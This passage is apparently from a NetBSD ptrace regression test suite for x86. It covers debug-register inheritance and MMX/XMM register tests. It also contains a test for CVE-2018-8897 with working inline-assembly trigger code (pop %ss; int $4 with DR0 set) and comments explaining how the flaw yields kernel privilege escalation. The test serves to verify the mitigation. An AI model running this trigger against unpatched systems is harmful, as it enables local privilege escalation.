	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child - expected stopped "
	    "SIGTRAP\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, SIGTRAP);

	SYSCALL_REQUIRE(ptrace(PT_GET_PROCESS_STATE, child, &state, slen) != -1);

	ATF_REQUIRE_EQ(state.pe_report_event, PTRACE_LWP_CREATE);

	lid = state.pe_lwp;
	DPRINTF("Reported PTRACE_LWP_CREATE event with lid %d\n", lid);

	DPRINTF("Call GETDBREGS for the child process new lwp (r2)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r2, lid) != -1);

	DPRINTF("State of the debug registers (r2):\n");
	for (i = 0; i < __arraycount(r2.dr); i++)
		DPRINTF("r2[%zu]=%" PRIxREGISTER "\n", i, r2.dr[i]);

	DPRINTF("Assert that (r1) and (r2) are not the same\n");
	ATF_REQUIRE(memcmp(&r1, &r2, sizeof(r1)) != 0);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child - expected exited\n",
	    TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child - expected no process\n",
	    TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}

ATF_TC(dbregs_dr0_dont_inherit_lwp);
ATF_TC_HEAD(dbregs_dr0_dont_inherit_lwp, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that 1 LWP creation is intercepted by ptrace(2) with "
	    "EVENT_MASK set to PTRACE_LWP_CREATE and Debug Register 0 from "
	    "the forker thread is not inherited");
}

ATF_TC_BODY(dbregs_dr0_dont_inherit_lwp, tc)
{
	dbregs_dont_inherit_lwp(0);
}

ATF_TC(dbregs_dr1_dont_inherit_lwp);
ATF_TC_HEAD(dbregs_dr1_dont_inherit_lwp, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that 1 LWP creation is intercepted by ptrace(2) with "
	    "EVENT_MASK set to PTRACE_LWP_CREATE and Debug Register 1 from "
	    "the forker thread is not inherited");
}

ATF_TC_BODY(dbregs_dr1_dont_inherit_lwp, tc)
{
	dbregs_dont_inherit_lwp(1);
}

ATF_TC(dbregs_dr2_dont_inherit_lwp);
ATF_TC_HEAD(dbregs_dr2_dont_inherit_lwp, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that 1 LWP creation is intercepted by ptrace(2) with "
	    "EVENT_MASK set to PTRACE_LWP_CREATE and Debug Register 2 from "
	    "the forker thread is not inherited");
}

ATF_TC_BODY(dbregs_dr2_dont_inherit_lwp, tc)
{
	dbregs_dont_inherit_lwp(2);
}

ATF_TC(dbregs_dr3_dont_inherit_lwp);
ATF_TC_HEAD(dbregs_dr3_dont_inherit_lwp, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that 1 LWP creation is intercepted by ptrace(2) with "
	    "EVENT_MASK set to PTRACE_LWP_CREATE and Debug Register 3 from "
	    "the forker thread is not inherited");
}

ATF_TC_BODY(dbregs_dr3_dont_inherit_lwp, tc)
{
	dbregs_dont_inherit_lwp(3);
}

static void
dbregs_dont_inherit_execve(int reg)
{
	const int sigval = SIGTRAP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	size_t i;
	struct dbreg r1;
	struct dbreg r2;

	struct ptrace_siginfo info;
	memset(&info, 0, sizeof(info));

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		DPRINTF("Before calling execve(2) from child\n");
		execlp("/bin/echo", "/bin/echo", NULL);

		FORKEE_ASSERT(0 && "Not reached");
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r1, 0) != -1);

	DPRINTF("State of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	r1.dr[reg] = (long)(intptr_t)check_happy;
	DPRINTF("Set DR%d (r1.dr[%d]) to new value %" PRIxREGISTER "\n",
	    reg, reg, r1.dr[reg]);

	DPRINTF("New state of the debug registers (r1):\n");
	for (i = 0; i < __arraycount(r1.dr); i++)
		DPRINTF("r1[%zu]=%" PRIxREGISTER "\n", i, r1.dr[i]);

	DPRINTF("Call SETDBREGS for the child process (r1)\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &r1, 0) != -1);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Before calling ptrace(2) with PT_GET_SIGINFO for child\n");
	SYSCALL_REQUIRE(ptrace(PT_GET_SIGINFO, child, &info, sizeof(info)) != -1);

	DPRINTF("Signal traced to lwpid=%d\n", info.psi_lwpid);
	DPRINTF("Signal properties: si_signo=%#x si_code=%#x si_errno=%#x\n",
	    info.psi_siginfo.si_signo, info.psi_siginfo.si_code,
	    info.psi_siginfo.si_errno);

	ATF_REQUIRE_EQ(info.psi_siginfo.si_signo, sigval);
	ATF_REQUIRE_EQ(info.psi_siginfo.si_code, TRAP_EXEC);

	DPRINTF("Call GETDBREGS for the child process after execve(2)\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &r2, 0) != -1);

	DPRINTF("State of the debug registers (r2):\n");
	for (i = 0; i < __arraycount(r2.dr); i++)
		DPRINTF("r2[%zu]=%" PRIxREGISTER "\n", i, r2.dr[i]);

	DPRINTF("Assert that (r1) and (r2) are not the same\n");
	ATF_REQUIRE(memcmp(&r1, &r2, sizeof(r1)) != 0);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}

ATF_TC(dbregs_dr0_dont_inherit_execve);
ATF_TC_HEAD(dbregs_dr0_dont_inherit_execve, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that execve(2) is intercepted by tracer and Debug "
	    "Register 0 is reset");
}

ATF_TC_BODY(dbregs_dr0_dont_inherit_execve, tc)
{
	dbregs_dont_inherit_execve(0);
}

ATF_TC(dbregs_dr1_dont_inherit_execve);
ATF_TC_HEAD(dbregs_dr1_dont_inherit_execve, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that execve(2) is intercepted by tracer and Debug "
	    "Register 1 is reset");
}

ATF_TC_BODY(dbregs_dr1_dont_inherit_execve, tc)
{
	dbregs_dont_inherit_execve(1);
}

ATF_TC(dbregs_dr2_dont_inherit_execve);
ATF_TC_HEAD(dbregs_dr2_dont_inherit_execve, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that execve(2) is intercepted by tracer and Debug "
	    "Register 2 is reset");
}

ATF_TC_BODY(dbregs_dr2_dont_inherit_execve, tc)
{
	dbregs_dont_inherit_execve(2);
}

ATF_TC(dbregs_dr3_dont_inherit_execve);
ATF_TC_HEAD(dbregs_dr3_dont_inherit_execve, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify that execve(2) is intercepted by tracer and Debug "
	    "Register 3 is reset");
}

ATF_TC_BODY(dbregs_dr3_dont_inherit_execve, tc)
{
	dbregs_dont_inherit_execve(3);
}

/// ----------------------------------------------------------------------------

ATF_TC(x86_cve_2018_8897);
ATF_TC_HEAD(x86_cve_2018_8897, tc)
{
	atf_tc_set_md_var(tc, "descr",
	    "Verify mitigation for CVE-2018-8897 (POP SS debug exception)");
}

#define X86_CVE_2018_8897_PAGE 0x5000 /* page addressable by 32-bit registers */

static void
x86_cve_2018_8897_trigger(void)
{
	/*
	 * A function to trigger the POP SS (CVE-2018-8897) vulnerability
	 *
	 * ifdef __x86_64__
	 *
	 * We need to switch to 32-bit mode execution on 64-bit kernel.
	 * This is achieved with far jump instruction and GDT descriptor
	 * set to 32-bit CS selector. The 32-bit CS selector is kernel
	 * specific, in the NetBSD case registered as GUCODE32_SEL
	 * that is equal to (14 (decimal) << 3) with GDT and user
	 * privilege level (this makes it 0x73).
	 *
	 * In UNIX as(1) assembly x86_64 far jump is coded as ljmp.
	 * amd64 ljmp requires an indirect address with cs:RIP.
	 *
	 * When we are running in 32-bit mode, it's similar to the
	 * mode as if the binary had been launched in netbsd32.
	 *
	 * There are two versions of this exploit, one with RIP
	 * relative code and the other with static addresses.
	 * The first one is PIE code aware, the other no-PIE one.
	 *
	 *
	 * After switching to the 32-bit mode we can move on to the remaining
	 * part of the exploit.
	 *
	 * endif //  __x86_64__
	 *
	 * Set the stack pointer to the page we allocated earlier. Remember
	 * that we put an SS selector exactly at this address, so we can pop.
	 *
	 * movl    $0x5000,%esp
	 *
	 * Pop the SS selector off the stack. This reloads the SS selector,
	 * which is fine. Remember that we set DR0 at address 0x5000, which
	 * we are now reading. Therefore, on this instruction, the CPU will
	 * raise a #DB exception.
	 *
	 * But the "pop %ss" instruction is special: it blocks exceptions
	 * until the next instruction is executed. So the #DB that we just
	 * raised is actually blocked.
	 *
	 * pop %ss
	 *
	 * We are still here, and didn't receive the #DB. After we execute
	 * this instruction, the effect of "pop %ss" will disappear, and
	 * we will receive the #DB for real.
	 *
	 * int $4
	 *
	 * Here the bug happens. We executed "int $4", so we entered the
	 * kernel, with interrupts disabled. The #DB that was pending is
	 * received. But, it is received immediately in kernel mode, and is
	 * _NOT_ received when interrupts are enabled again.
	 *
	 * It means that, in the first instruction of the $4 handler, we
	 * think we are safe with interrupts disabled. But we aren't, and
	 * just got interrupted.													        
	 *
	 * The new interrupt handler doesn't handle this particular context:
	 * we are entered in kernel mode, the previous context was kernel
	 * mode too but it still had the user context loaded.
	 *
	 * We find ourselves not doing a 'swapgs'. At the end of the day, it
	 * means that we call trap() with a curcpu() that is fully
	 * controllable by userland. From then on, it is easy to escalate
	 * privileges.
	 *
	 * With SVS it also means we don't switch CR3, so this results in a
	 * triple fault, which this time cannot be turned to a privilege
	 * escalation.
	 */

#if __x86_64__
#if __PIE__
	void *csRIP;

	csRIP = malloc(sizeof(int) + sizeof(short));
	FORKEE_ASSERT(csRIP != NULL);

	__asm__ __volatile__(
		"	leal 24(%%eip), %%eax\n\t"
		"	movq %0, %%rdx\n\t"
		"	movl %%eax, (%%rdx)\n\t"
		"	movw $0x73, 4(%%rdx)\n\t"
		"	movq %1, %%rax\n\t"
		"	ljmp *(%%rax)\n\t"
		"	.code32\n\t"
		"	movl $0x5000, %%esp\n\t"
		"	pop %%ss\n\t"
		"	int $4\n\t"
		"	.code64\n\t"
		: "=m"(csRIP)
		: "m"(csRIP)
		: "%rax", "%rdx", "%rsp"
		);
#else /* !__PIE__ */
	__asm__ __volatile__(
		"       movq $farjmp32, %%rax\n\t"
		"       ljmp *(%%rax)\n\t"
		"farjmp32:\n\t"
		"       .long trigger32\n\t"
		"       .word 0x73\n\t"
		"       .code32\n\t"
		"trigger32:\n\t"
		"       movl $0x5000, %%esp\n\t"
		"       pop %%ss\n\t"
		"       int $4\n\t"
		"       .code64\n\t"
		:
		:
		: "%rax", "%rsp"
		);
#endif
#elif __i386__
	__asm__ __volatile__(
		"movl $0x5000, %%esp\n\t"
		"pop %%ss\n\t"
		"int $4\n\t"
		:
		:
		: "%esp"
		);
#endif
}

ATF_TC_BODY(x86_cve_2018_8897, tc)
{
	const int sigval = SIGSTOP;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	int status;
#endif
	char *trap_page;
	struct dbreg db;
	

	if (!can_we_set_dbregs()) {
		atf_tc_skip("Either run this test as root or set sysctl(3) "
		            "security.models.extensions.user_set_dbregs to 1");
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		trap_page = mmap((void *)X86_CVE_2018_8897_PAGE,
		                 sysconf(_SC_PAGESIZE), PROT_READ|PROT_WRITE,
		                 MAP_FIXED|MAP_ANON|MAP_PRIVATE, -1, 0);

		/* trigger page fault */
		memset(trap_page, 0, sysconf(_SC_PAGESIZE));

		// kernel GDT
#if __x86_64__
		/* SS selector (descriptor 9 (0x4f >> 3)) */
		*trap_page = 0x4f;
#elif __i386__
		/* SS selector (descriptor 4 (0x23 >> 3)) */
		*trap_page = 0x23;
#endif

		DPRINTF("Before raising %s from child\n", strsignal(sigval));
		FORKEE_ASSERT(raise(sigval) == 0);

		x86_cve_2018_8897_trigger();

		/* NOTREACHED */
		FORKEE_ASSERTX(0 && "This shall not be reached");
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETDBREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_GETDBREGS, child, &db, 0) != -1);

	/*
	 * Set up the dbregs. We put the 0x5000 address in DR0.
	 * It means that, the first time we touch this, the CPU will trigger a
	 * #DB exception.
	 */
	db.dr[0] = X86_CVE_2018_8897_PAGE;
	db.dr[7] = 0x30003;

	DPRINTF("Call SETDBREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_SETDBREGS, child, &db, 0) != -1);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	// In this test we receive SIGFPE, is this appropriate?
//	validate_status_stopped(status, SIGFPE);

	DPRINTF("Kill the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_KILL, child, NULL, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_signaled(status, SIGKILL, 0);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}

ATF_TC(x86_regs_mm_read);
ATF_TC_HEAD(x86_regs_mm_read, tc)
{
	atf_tc_set_md_var(tc, "descr",
		"Set MMX (mm0..mm7) reg values from debugged program and read "
		"them via PT_GETFPREGS, comparing values against expected.");
}

__attribute__((target("mmx")))
static __inline void set_mm_regs(const uint64_t mm[])
{
	__asm__ __volatile__(
		"movq    0x00(%0), %%mm0\n\t"
		"movq    0x08(%0), %%mm1\n\t"
		"movq    0x10(%0), %%mm2\n\t"
		"movq    0x18(%0), %%mm3\n\t"
		"movq    0x20(%0), %%mm4\n\t"
		"movq    0x28(%0), %%mm5\n\t"
		"movq    0x30(%0), %%mm6\n\t"
		"movq    0x38(%0), %%mm7\n\t"
		"int3\n\t"
		:
		: "b"(mm)
		: "%mm0", "%mm1", "%mm2", "%mm3", "%mm4", "%mm5", "%mm6", "%mm7"
	);
}

ATF_TC_BODY(x86_regs_mm_read, tc)
{
	const int exitval = 5;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	const int sigval = SIGTRAP;
	int status;
#endif
	struct fpreg fpr;

	const uint64_t mm[] = {
		0x0001020304050607,
		0x1011121314151617,
		0x2021222324252627,
		0x3031323334353637,
		0x4041424344454647,
		0x5051525354555657,
		0x6061626364656667,
		0x7071727374757677,
	};

	/* verify whether MMX is supported here */
	DPRINTF("Before invoking cpuid\n");
	{
		unsigned int eax, ebx, ecx, edx;
		if (!__get_cpuid(1, &eax, &ebx, &ecx, &edx))
			atf_tc_skip("CPUID is not supported by the CPU");

		DPRINTF("cpuid: EDX = %08x\n", edx);

		if (!(edx & bit_MMX))
			atf_tc_skip("MMX is not supported by the CPU");
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before running assembly from child\n");
		set_mm_regs(mm);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETFPREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_GETFPREGS, child, &fpr, 0) != -1);

#if defined(__x86_64__)
#define MM_REG(n) fpr.fxstate.fx_87_ac[n].r.f87_mantissa
#else
#define MM_REG(n) fpr.fstate.s87_ac[n].f87_mantissa
#endif

	ATF_CHECK_EQ(MM_REG(0), mm[0]);
	ATF_CHECK_EQ(MM_REG(1), mm[1]);
	ATF_CHECK_EQ(MM_REG(2), mm[2]);
	ATF_CHECK_EQ(MM_REG(3), mm[3]);
	ATF_CHECK_EQ(MM_REG(4), mm[4]);
	ATF_CHECK_EQ(MM_REG(5), mm[5]);
	ATF_CHECK_EQ(MM_REG(6), mm[6]);
	ATF_CHECK_EQ(MM_REG(7), mm[7]);

#undef MM_REG

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}

__attribute__((target("mmx")))
static __inline void get_mm_regs(uint64_t v_mm[])
{
	const uint64_t fill = 0x0F0F0F0F0F0F0F0F;

	__asm__ __volatile__(
		/* fill registers with clobber pattern */
		"movq    %1, %%mm0\n\t"
		"movq    %1, %%mm1\n\t"
		"movq    %1, %%mm2\n\t"
		"movq    %1, %%mm3\n\t"
		"movq    %1, %%mm4\n\t"
		"movq    %1, %%mm5\n\t"
		"movq    %1, %%mm6\n\t"
		"movq    %1, %%mm7\n\t"
		"\n\t"
		"int3\n\t"
		"\n\t"
		"movq    %%mm0, 0x00(%0)\n\t"
		"movq    %%mm1, 0x08(%0)\n\t"
		"movq    %%mm2, 0x10(%0)\n\t"
		"movq    %%mm3, 0x18(%0)\n\t"
		"movq    %%mm4, 0x20(%0)\n\t"
		"movq    %%mm5, 0x28(%0)\n\t"
		"movq    %%mm6, 0x30(%0)\n\t"
		"movq    %%mm7, 0x38(%0)\n\t"
		:
		: "a"(v_mm), "m"(fill)
		: "%mm0", "%mm1", "%mm2", "%mm3", "%mm4", "%mm5", "%mm6", "%mm7"
	);
}

ATF_TC(x86_regs_mm_write);
ATF_TC_HEAD(x86_regs_mm_write, tc)
{
	atf_tc_set_md_var(tc, "descr",
		"Set mm0..mm7 reg values into a debugged program via "
		"PT_SETFPREGS and compare the result against expected.");
}

ATF_TC_BODY(x86_regs_mm_write, tc)
{
	const int exitval = 5;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	const int sigval = SIGTRAP;
	int status;
#endif
	struct fpreg fpr;

	const uint64_t mm[] = {
		0x0001020304050607,
		0x1011121314151617,
		0x2021222324252627,
		0x3031323334353637,
		0x4041424344454647,
		0x5051525354555657,
		0x6061626364656667,
		0x7071727374757677,
	};

	/* verify whether MMX is supported here */
	DPRINTF("Before invoking cpuid\n");
	{
		unsigned int eax, ebx, ecx, edx;
		if (!__get_cpuid(1, &eax, &ebx, &ecx, &edx))
			atf_tc_skip("CPUID is not supported by the CPU");

		DPRINTF("cpuid: EDX = %08x\n", edx);

		if (!(edx & bit_MMX))
			atf_tc_skip("MMX is not supported by the CPU");
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		uint64_t v_mm[8];

		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before running assembly from child\n");
		get_mm_regs(v_mm);

		FORKEE_ASSERT_EQ(v_mm[0], mm[0]);
		FORKEE_ASSERT_EQ(v_mm[1], mm[1]);
		FORKEE_ASSERT_EQ(v_mm[2], mm[2]);
		FORKEE_ASSERT_EQ(v_mm[3], mm[3]);
		FORKEE_ASSERT_EQ(v_mm[4], mm[4]);
		FORKEE_ASSERT_EQ(v_mm[5], mm[5]);
		FORKEE_ASSERT_EQ(v_mm[6], mm[6]);
		FORKEE_ASSERT_EQ(v_mm[7], mm[7]);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

	DPRINTF("Call GETFPREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_GETFPREGS, child, &fpr, 0) != -1);

#if defined(__x86_64__)
#define MM_REG(n) fpr.fxstate.fx_87_ac[n].r.f87_mantissa
#else
#define MM_REG(n) fpr.fstate.s87_ac[n].f87_mantissa
#endif

	MM_REG(0) = mm[0];
	MM_REG(1) = mm[1];
	MM_REG(2) = mm[2];
	MM_REG(3) = mm[3];
	MM_REG(4) = mm[4];
	MM_REG(5) = mm[5];
	MM_REG(6) = mm[6];
	MM_REG(7) = mm[7];

#undef MM_REG

	DPRINTF("Call SETFPREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_SETFPREGS, child, &fpr, 0) != -1);

	DPRINTF("Before resuming the child process where it left off and "
	    "without signal to be sent\n");
	SYSCALL_REQUIRE(ptrace(PT_CONTINUE, child, (void *)1, 0) != -1);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_exited(status, exitval);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_FAILURE(ECHILD, wpid = TWAIT_GENERIC(child, &status, 0));
}

__attribute__((target("sse")))
static __inline void set_xmm_regs(const void* xmm)
{
	__asm__ __volatile__(
		"movaps   0x00(%0), %%xmm0\n\t"
		"movaps   0x10(%0), %%xmm1\n\t"
		"movaps   0x20(%0), %%xmm2\n\t"
		"movaps   0x30(%0), %%xmm3\n\t"
		"movaps   0x40(%0), %%xmm4\n\t"
		"movaps   0x50(%0), %%xmm5\n\t"
		"movaps   0x60(%0), %%xmm6\n\t"
		"movaps   0x70(%0), %%xmm7\n\t"
#if defined(__x86_64__)
		"movaps   0x80(%0), %%xmm8\n\t"
		"movaps   0x90(%0), %%xmm9\n\t"
		"movaps   0xA0(%0), %%xmm10\n\t"
		"movaps   0xB0(%0), %%xmm11\n\t"
		"movaps   0xC0(%0), %%xmm12\n\t"
		"movaps   0xD0(%0), %%xmm13\n\t"
		"movaps   0xE0(%0), %%xmm14\n\t"
		"movaps   0xF0(%0), %%xmm15\n\t"
#endif
		"int3\n\t"
		:
		: "b"(xmm)
		: "%xmm0", "%xmm1", "%xmm2", "%xmm3", "%xmm4", "%xmm5", "%xmm6",
		"%xmm7"
#if defined(__x86_64__)
		, "%xmm8", "%xmm9", "%xmm10", "%xmm11", "%xmm12", "%xmm13",
		"%xmm14", "%xmm15"
#endif
	);
}

ATF_TC(x86_regs_xmm_read);
ATF_TC_HEAD(x86_regs_xmm_read, tc)
{
	atf_tc_set_md_var(tc, "descr",
		"Set xmm0..xmm15 (..xmm7 on i386) reg values from debugged program "
		"and read them via PT_GETFPREGS (PT_GETXMMREGS on i386), comparing "
		"values against expected.");
}

ATF_TC_BODY(x86_regs_xmm_read, tc)
{
	const int exitval = 5;
	pid_t child, wpid;
#if defined(TWAIT_HAVE_STATUS)
	const int sigval = SIGTRAP;
	int status;
#endif
#if defined(__x86_64__)
	struct fpreg fpr;
#else
	struct xmmregs fpr;
#endif

	const struct {
		uint64_t a, b;
	} xmm[] __aligned(16) = {
		{ 0x0706050403020100, 0x0F0E0D0C0B0A0908, },
		{ 0x0807060504030201, 0x100F0E0D0C0B0A09, },
		{ 0x0908070605040302, 0x11100F0E0D0C0B0A, },
		{ 0x0A09080706050403, 0x1211100F0E0D0C0B, },
		{ 0x0B0A090807060504, 0x131211100F0E0D0C, },
		{ 0x0C0B0A0908070605, 0x14131211100F0E0D, },
		{ 0x0D0C0B0A09080706, 0x1514131211100F0E, },
		{ 0x0E0D0C0B0A090807, 0x161514131211100F, },
#if defined(__x86_64__)
		{ 0x0F0E0D0C0B0A0908, 0x1716151413121110, },
		{ 0x100F0E0D0C0B0A09, 0x1817161514131211, },
		{ 0x11100F0E0D0C0B0A, 0x1918171615141312, },
		{ 0x1211100F0E0D0C0B, 0x1A19181716151413, },
		{ 0x131211100F0E0D0C, 0x1B1A191817161514, },
		{ 0x14131211100F0E0D, 0x1C1B1A1918171615, },
		{ 0x1514131211100F0E, 0x1D1C1B1A19181716, },
		{ 0x161514131211100F, 0x1E1D1C1B1A191817, },
#endif
	};

	/* verify whether SSE is supported here */
	DPRINTF("Before invoking cpuid\n");
	{
		unsigned int eax, ebx, ecx, edx;
		if (!__get_cpuid(1, &eax, &ebx, &ecx, &edx))
			atf_tc_skip("CPUID is not supported by the CPU");

		DPRINTF("cpuid: EDX = %08x\n", edx);

		if (!(edx & bit_SSE))
			atf_tc_skip("SSE is not supported by the CPU");
	}

	DPRINTF("Before forking process PID=%d\n", getpid());
	SYSCALL_REQUIRE((child = fork()) != -1);
	if (child == 0) {
		DPRINTF("Before calling PT_TRACE_ME from child %d\n", getpid());
		FORKEE_ASSERT(ptrace(PT_TRACE_ME, 0, NULL, 0) != -1);

		DPRINTF("Before running assembly from child\n");
		set_xmm_regs(xmm);

		DPRINTF("Before exiting of the child process\n");
		_exit(exitval);
	}
	DPRINTF("Parent process PID=%d, child's PID=%d\n", getpid(), child);

	DPRINTF("Before calling %s() for the child\n", TWAIT_FNAME);
	TWAIT_REQUIRE_SUCCESS(wpid = TWAIT_GENERIC(child, &status, 0), child);

	validate_status_stopped(status, sigval);

#if defined(__x86_64__)
	DPRINTF("Call GETFPREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_GETFPREGS, child, &fpr, 0) != -1);
#else
	DPRINTF("Call GETXMMREGS for the child process\n");
	SYSCALL_REQUIRE(ptrace(PT_GETXMMREGS, child, &fpr, 0) != -1);
#endif

	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[0], &xmm[0], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[1], &xmm[1], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[2], &xmm[2], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[3], &xmm[3], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[4], &xmm[4], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[5], &xmm[5], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[6], &xmm[6], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[7], &xmm[7], sizeof(*xmm)));
#if defined(__x86_64__)
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[8], &xmm[8], sizeof(*xmm)));
	ATF_CHECK(!memcmp(&fpr.fxstate.fx_xmm[9], &xmm[9], sizeof(*xmm)));
